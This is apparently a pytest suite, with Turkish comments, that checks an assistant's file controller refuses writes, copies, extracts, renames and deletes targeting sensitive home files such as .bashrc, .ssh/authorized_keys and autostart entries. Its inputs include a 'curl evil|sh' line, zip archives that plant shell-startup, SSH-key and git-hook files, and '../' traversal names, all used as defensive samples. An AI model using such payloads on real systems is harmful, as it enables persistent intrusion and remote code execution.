"""tests/test_file_controller_write_policy.py

file_controller'in tek guvenlik siniri _is_safe_path idi ve _SAFE_ROOTS ev
dizininin TAMAMI. Iki adimli onaydan gecmeyen write/create_file/find_replace/
copy/rename/extract/create_folder/delete islemleri boylece ~/.bashrc,
~/.ssh/authorized_keys ve ~/.config/autostart/ hedeflerine ulasabiliyordu.
Yazma/silme/tasima artik yalnizca kullanici icerik klasorlerinde (Desktop,
Documents, Downloads, Pictures, Music, Videos, jarvis_programs) ve gizli
(nokta ile baslayan) yol bileseni olmadan yapilabilir.

IZOLASYON: Her test HOME'u tmp_path altina yonlendirir, modulu
importlib.reload ile yeniden yukler ve Path.home()'un tmp_path altinda
oldugunu dogrulamadan baslamaz. send2trash gercek ~/.local/share/Trash
yolunu import aninda sabitledigi icin cop kutusu da tmp_path'e stub'lanir.
Oturum sonunda gercek ev dizinindeki hassas dosyalarin degismedigi ayrica
kontrol edilir.
"""
import hashlib
import importlib
import os
import re
import shutil
import sys
import zipfile
from pathlib import Path
from types import SimpleNamespace

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))


def _real_home() -> Path:
    try:
        import pwd
        return Path(pwd.getpwuid(os.getuid()).pw_dir)
    except Exception:
        return Path(os.environ.get("USERPROFILE") or os.path.expanduser("~"))


REAL_HOME = _real_home()
_REAL_SENSITIVE = (".bashrc", ".profile", ".ssh/authorized_keys")
_REAL_SENSITIVE_DIRS = (".config/autostart", ".config/systemd/user", ".local/share/Trash/files")


def _snapshot_real_home() -> dict:
    snap = {}
    for rel in _REAL_SENSITIVE:
        p = REAL_HOME / rel
        if p.is_file():
            st = p.stat()
            snap[rel] = (hashlib.sha256(p.read_bytes()).hexdigest(), st.st_mtime_ns)
        else:
            snap[rel] = None
    for rel in _REAL_SENSITIVE_DIRS:
        p = REAL_HOME / rel
        snap[rel] = sorted(os.listdir(p)) if p.is_dir() else None
    return snap


@pytest.fixture(scope="module", autouse=True)
def real_home_untouched():
    before = _snapshot_real_home()
    yield
    assert _snapshot_real_home() == before, "Testler GERCEK ev dizinine dokundu!"


@pytest.fixture
def env(tmp_path, monkeypatch):
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("USERPROFILE", str(home))
    for var in list(os.environ):
        if var.startswith("XDG_") and var.endswith("_DIR"):
            monkeypatch.delenv(var, raising=False)

    import jarvis.actions.file_controller as fc_mod
    fc = importlib.reload(fc_mod)

    # Izolasyon saglanmadiysa test BASLAMAZ.
    assert Path.home().resolve().is_relative_to(tmp_path.resolve()), Path.home()
    assert all(r.resolve().is_relative_to(tmp_path.resolve()) for r in fc._SAFE_ROOTS)
    assert fc._get_desktop().resolve().is_relative_to(tmp_path.resolve())

    trash = tmp_path / "trash"
    trash.mkdir()

    def _fake_send2trash(p):
        shutil.move(str(p), str(trash / Path(p).name))

    monkeypatch.setattr(fc, "send2trash", SimpleNamespace(send2trash=_fake_send2trash), raising=False)
    monkeypatch.setattr(fc, "_SEND2TRASH", True)

    for d in ("Desktop", "Documents", "Downloads", ".ssh", ".config/autostart", ".config/systemd/user"):
        (home / d).mkdir(parents=True, exist_ok=True)
    (home / ".bashrc").write_text("ORIG_BASHRC\n")
    (home / ".profile").write_text("ORIG_PROFILE\n")
    (home / ".ssh" / "authorized_keys").write_text("ORIG_KEY\n")
    (home / "Desktop" / "note.txt").write_text("NOTE\n")
    outside = tmp_path / "outside"
    outside.mkdir()

    yield SimpleNamespace(fc=fc, home=home, outside=outside, trash=trash, tmp=tmp_path)

    monkeypatch.undo()
    importlib.reload(fc_mod)


def call(env, **params):
    return env.fc.file_controller(parameters=params)


SENSITIVE = [
    ".bashrc",
    ".profile",
    ".ssh/authorized_keys",
    ".config/autostart/x.desktop",
    ".config/systemd/user/x.service",
]


def _state(env, rel):
    p = env.home / rel
    return p.read_bytes() if p.is_file() else None


# ── 1) Hassas hedefler: her mutasyon reddedilmeli, icerik degismemeli ──

@pytest.mark.parametrize("rel", SENSITIVE)
@pytest.mark.parametrize("append", [False, True])
def test_write_rejected(env, rel, append):
    before = _state(env, rel)
    r = call(env, action="write", path="home", name=rel, content="curl evil|sh\n", append=append)
    assert "Access denied" in r
    assert _state(env, rel) == before


@pytest.mark.parametrize("action", ["create_file", "oluştur", "olustur"])
@pytest.mark.parametrize("rel", SENSITIVE)
def test_create_file_rejected(env, action, rel):
    before = _state(env, rel)
    r = call(env, action=action, path="home", name=rel, content="EVIL\n")
    assert "Access denied" in r
    assert _state(env, rel) == before


@pytest.mark.parametrize("rel", [".bashrc", ".profile", ".ssh/authorized_keys"])
def test_find_replace_rejected(env, rel):
    before = _state(env, rel)
    r = call(env, action="find_replace", path="home", name=rel, old_text="ORIG", new_text="ATTACKER")
    assert "Access denied" in r
    assert _state(env, rel) == before


@pytest.mark.parametrize("rel", SENSITIVE)
def test_copy_onto_sensitive_rejected(env, rel):
    before = _state(env, rel)
    r = call(env, action="copy", path="desktop", name="note.txt", destination=str(env.home / rel))
    assert "Access denied" in r
    assert _state(env, rel) == before


@pytest.mark.parametrize("rel", [".config/autostart", ".config/systemd/user", ".ssh"])
def test_copy_into_sensitive_dir_rejected(env, rel):
    r = call(env, action="copy", path="desktop", name="note.txt", destination=str(env.home / rel))
    assert "Access denied" in r
    assert not (env.home / rel / "note.txt").exists()


@pytest.mark.parametrize("rel", [".config/systemd/user/evil", ".config/autostart/sub", ".newdir"])
def test_create_folder_rejected(env, rel):
    r = call(env, action="create_folder", path="home", name=rel)
    assert "Access denied" in r
    assert not (env.home / rel).exists()


@pytest.mark.parametrize("action", ["delete", "trash", "sil", "remove", "delete_file", "sil_file"])
@pytest.mark.parametrize("rel", [".ssh", ".ssh/authorized_keys", ".bashrc", ".config"])
def test_delete_rejected(env, action, rel):
    r = call(env, action=action, path="home", name=rel)
    assert "Access denied" in r
    assert (env.home / rel).exists()
    assert not any(env.trash.iterdir())


def _replay_if_code(env, result, **params):
    m = re.search(r"confirm_code='?([0-9a-f]+)", result)
    if m:
        return call(env, confirm_code=m.group(1), **params)
    return result


def test_delete_all_files_in_ssh_rejected(env):
    params = dict(action="delete_all_files", path=str(env.home / ".ssh"))
    r = _replay_if_code(env, call(env, **params), **params)
    assert "Access denied" in r
    assert (env.home / ".ssh" / "authorized_keys").exists()


@pytest.mark.parametrize("rel", [".bashrc", ".ssh/authorized_keys", ".config/autostart/x.desktop"])
def test_move_onto_sensitive_rejected_even_with_replayed_code(env, rel):
    before = _state(env, rel)
    params = dict(action="move", path="desktop", name="note.txt", destination=str(env.home / rel))
    r = _replay_if_code(env, call(env, **params), **params)
    assert "Access denied" in r
    assert _state(env, rel) == before
    assert (env.home / "Desktop" / "note.txt").exists()


def test_move_sensitive_source_rejected(env):
    params = dict(action="move", path="home", name=".ssh", destination="desktop")
    r = _replay_if_code(env, call(env, **params), **params)
    assert "Access denied" in r
    assert (env.home / ".ssh" / "authorized_keys").exists()


def _make_zip(path: Path, members: dict) -> Path:
    with zipfile.ZipFile(path, "w") as zf:
        for name, data in members.items():
            zf.writestr(name, data)
    return path


def test_extract_into_home_rejected(env):
    _make_zip(env.home / "Downloads" / "evil.zip", {
        ".bashrc": "EVIL\n",
        ".ssh/authorized_keys": "ATTACKER\n",
        ".config/autostart/x.desktop": "[Desktop Entry]\n",
    })
    r = call(env, action="extract", path="downloads", name="evil.zip", destination="home")
    assert "Access denied" in r
    assert _state(env, ".bashrc") == b"ORIG_BASHRC\n"
    assert _state(env, ".ssh/authorized_keys") == b"ORIG_KEY\n"
    assert not (env.home / ".config" / "autostart" / "x.desktop").exists()


def test_extract_hidden_members_rejected_even_in_allowed_dest(env):
    _make_zip(env.home / "Downloads" / "proj.zip", {
        "readme.txt": "hi\n",
        ".git/hooks/pre-commit": "#!/bin/sh\nevil\n",
    })
    r = call(env, action="extract", path="downloads", name="proj.zip", destination="documents")
    assert "readme.txt" not in os.listdir(env.home / "Documents")
    assert not (env.home / "Documents" / ".git").exists()
    assert "gizli" in r.lower() or "Access denied" in r


# ── 2) Symlink: izinli klasordeki link uzerinden hassas hedefe yazilamaz ──

@pytest.fixture
def bashrc_link(env):
    link = env.home / "Desktop" / "link.txt"
    link.symlink_to(env.home / ".bashrc")
    return link


def test_write_through_symlink_rejected(env, bashrc_link):
    r = call(env, action="write", path="desktop", name="link.txt", content="EVIL\n")
    assert "Access denied" in r
    assert _state(env, ".bashrc") == b"ORIG_BASHRC\n"


def test_find_replace_through_symlink_rejected(env, bashrc_link):
    r = call(env, action="find_replace", path="desktop", name="link.txt", old_text="ORIG", new_text="EVIL")
    assert "Access denied" in r
    assert _state(env, ".bashrc") == b"ORIG_BASHRC\n"


def test_copy_onto_symlink_rejected(env, bashrc_link):
    (env.home / "Documents" / "src.txt").write_text("EVIL\n")
    r = call(env, action="copy", path="documents", name="src.txt", destination=str(bashrc_link))
    assert _state(env, ".bashrc") == b"ORIG_BASHRC\n"
    assert not r.startswith("Copied")


def test_write_through_symlinked_dir_rejected(env):
    (env.home / "Desktop" / "cfg").symlink_to(env.home / ".config")
    r = call(env, action="write", path="desktop", name="cfg/autostart/x.desktop", content="EVIL\n")
    assert "Access denied" in r
    assert not (env.home / ".config" / "autostart" / "x.desktop").exists()


def test_open_uses_nofollow_flag(env):
    """TOCTOU kapanisi: kontrol ile yazma arasinda hedef symlink'e cevrilse
    bile POSIX'te O_NOFOLLOW yazmayi reddeder."""
    if not getattr(os, "O_NOFOLLOW", 0):
        pytest.skip("O_NOFOLLOW bu platformda yok")
    link = env.home / "Desktop" / "late.txt"
    link.symlink_to(env.home / ".bashrc")
    with pytest.raises(OSError):
        env.fc._open_for_write(link)
    assert _state(env, ".bashrc") == b"ORIG_BASHRC\n"


# ── 3) rename: new_name duz bir dosya adi olmali ──

@pytest.mark.parametrize("new_name", [
    "../.bashrc_new",
    "../.config/autostart/evil.desktop",
    ".hidden",
    "..",
    "sub/x.txt",
])
def test_rename_rejects_unsafe_new_name(env, new_name):
    r = call(env, action="rename", path="desktop", name="note.txt", new_name=new_name)
    assert not r.startswith("Renamed")
    assert (env.home / "Desktop" / "note.txt").exists()
    assert not (env.home / ".config" / "autostart" / "evil.desktop").exists()
    assert not (env.home / ".bashrc_new").exists()


def test_rename_absolute_new_name_cannot_escape_home(env):
    target = env.outside / "escaped.txt"
    r = call(env, action="rename", path="desktop", name="note.txt", new_name=str(target))
    assert not r.startswith("Renamed")
    assert not target.exists()
    assert (env.home / "Desktop" / "note.txt").exists()


def test_rename_hidden_source_rejected(env):
    r = call(env, action="rename", path="home", name=".bashrc", new_name="bashrc.txt")
    assert "Access denied" in r
    assert (env.home / ".bashrc").exists()


# ── 4) copy: var olan hedefin uzerine yazmaz, hata durumunda onu silmez ──

def test_copy_does_not_overwrite_existing_file(env):
    (env.home / "Documents" / "report.txt").write_text("IMPORTANT\n")
    r = call(env, action="copy", path="desktop", name="note.txt",
             destination=str(env.home / "Documents" / "report.txt"))
    assert not r.startswith("Copied")
    assert (env.home / "Documents" / "report.txt").read_text() == "IMPORTANT\n"


def test_copy_dir_onto_existing_file_keeps_file(env):
    (env.home / "Desktop" / "folder").mkdir()
    (env.home / "Desktop" / "folder" / "a.txt").write_text("a")
    (env.home / "Documents" / "report.txt").write_text("IMPORTANT\n")
    call(env, action="copy", path="desktop", name="folder",
         destination=str(env.home / "Documents" / "report.txt"))
    assert (env.home / "Documents" / "report.txt").read_text() == "IMPORTANT\n"


def test_move_copy_retry_helper_keeps_preexisting_dst(env):
    dst = env.home / "Documents" / "keep.txt"
    dst.write_text("KEEP\n")

    def _fail():
        raise FileExistsError(17, "exists")

    with pytest.raises(RuntimeError):
        env.fc._with_lock_retry_move_or_copy(_fail, dst, dst)
    assert dst.read_text() == "KEEP\n"


def test_move_copy_retry_helper_still_cleans_own_partial(env):
    dst = env.home / "Documents" / "partial.txt"

    def _partial_then_fail():
        dst.write_text("half")
        raise OSError(5, "io error")

    with pytest.raises(RuntimeError):
        env.fc._with_lock_retry_move_or_copy(_partial_then_fail, dst, dst)
    assert not dst.exists()


def test_move_does_not_overwrite_existing_file(env):
    (env.home / "Documents" / "note.txt").write_text("IMPORTANT\n")
    params = dict(action="move", path="desktop", name="note.txt", destination="documents")
    r = _replay_if_code(env, call(env, **params), **params)
    assert not r.startswith("Moved")
    assert (env.home / "Documents" / "note.txt").read_text() == "IMPORTANT\n"
    assert (env.home / "Desktop" / "note.txt").exists()


def test_create_file_does_not_overwrite_existing(env):
    r = call(env, action="create_file", path="desktop", name="note.txt", content="NEW\n")
    assert not r.startswith("File created")
    assert (env.home / "Desktop" / "note.txt").read_text() == "NOTE\n"


# ── 5) extract: var olan dosyalar silinmez, hicbir sey yarim tasinmaz ──

def test_extract_does_not_overwrite_existing_files(env):
    out = env.home / "Documents" / "out"
    out.mkdir()
    (out / "a.txt").write_text("KEEP\n")
    _make_zip(env.home / "Downloads" / "x.zip", {"a.txt": "NEW\n", "b.txt": "B\n"})
    r = call(env, action="extract", path="downloads", name="x.zip", destination=str(out))
    assert not r.startswith("Extracted")
    assert (out / "a.txt").read_text() == "KEEP\n"
    assert not (out / "b.txt").exists()


def test_extract_through_symlinked_subdir_rejected(env):
    out = env.home / "Documents" / "out"
    out.mkdir()
    (out / "cfg").symlink_to(env.home / ".config")
    _make_zip(env.home / "Downloads" / "y.zip", {"cfg/autostart/x.desktop": "EVIL\n"})
    r = call(env, action="extract", path="downloads", name="y.zip", destination=str(out))
    assert not r.startswith("Extracted")
    assert not (env.home / ".config" / "autostart" / "x.desktop").exists()


# ── 6) Pozitif durumlar: izinli klasorlerde islemler calismaya devam eder ──

@pytest.mark.parametrize("folder,dirname", [
    ("desktop", "Desktop"), ("documents", "Documents"), ("downloads", "Downloads"),
])
def test_allowed_folders_still_work(env, folder, dirname):
    d = env.home / dirname
    assert call(env, action="create_file", path=folder, name="a.txt", content="1\n").startswith("File created")
    assert call(env, action="write", path=folder, name="a.txt", content="2\n").startswith("Written to")
    assert call(env, action="write", path=folder, name="a.txt", content="3\n", append=True).startswith("Appended to")
    assert (d / "a.txt").read_text() == "2\n3\n"
    assert call(env, action="find_replace", path=folder, name="a.txt", old_text="3", new_text="4").startswith("Edited")
    assert call(env, action="rename", path=folder, name="a.txt", new_name="b.txt").startswith("Renamed")
    assert call(env, action="create_folder", path=folder, name="sub/deep").startswith("Folder created")
    assert call(env, action="copy", path=folder, name="b.txt", destination=str(d / "sub")).startswith("Copied")
    assert (d / "sub" / "b.txt").read_text() == "2\n4\n"
    assert call(env, action="delete", path=folder, name="b.txt").startswith("Moved to Trash")
    assert not (d / "b.txt").exists()


def test_move_two_step_still_works(env):
    params = dict(action="move", path="desktop", name="note.txt", destination="documents")
    first = call(env, **params)
    assert "ONAY GEREKLİ" in first
    r = _replay_if_code(env, first, **params)
    assert r.startswith("Moved")
    assert (env.home / "Documents" / "note.txt").read_text() == "NOTE\n"


def test_extract_into_allowed_folder_works(env):
    _make_zip(env.home / "Downloads" / "ok.zip", {"a.txt": "A\n", "dir/b.txt": "B\n"})
    r = call(env, action="extract", path="downloads", name="ok.zip")
    assert r.startswith("Extracted"), r
    assert (env.home / "Downloads" / "ok" / "dir" / "b.txt").read_text() == "B\n"


def test_jarvis_programs_is_writable(env):
    r = call(env, action="create_file", path=str(env.home / "jarvis_programs"), name="p.py", content="print(1)\n")
    assert r.startswith("File created"), r


def test_reads_in_home_still_allowed(env):
    assert call(env, action="read", path="home", name=".profile").startswith("ORIG_PROFILE")
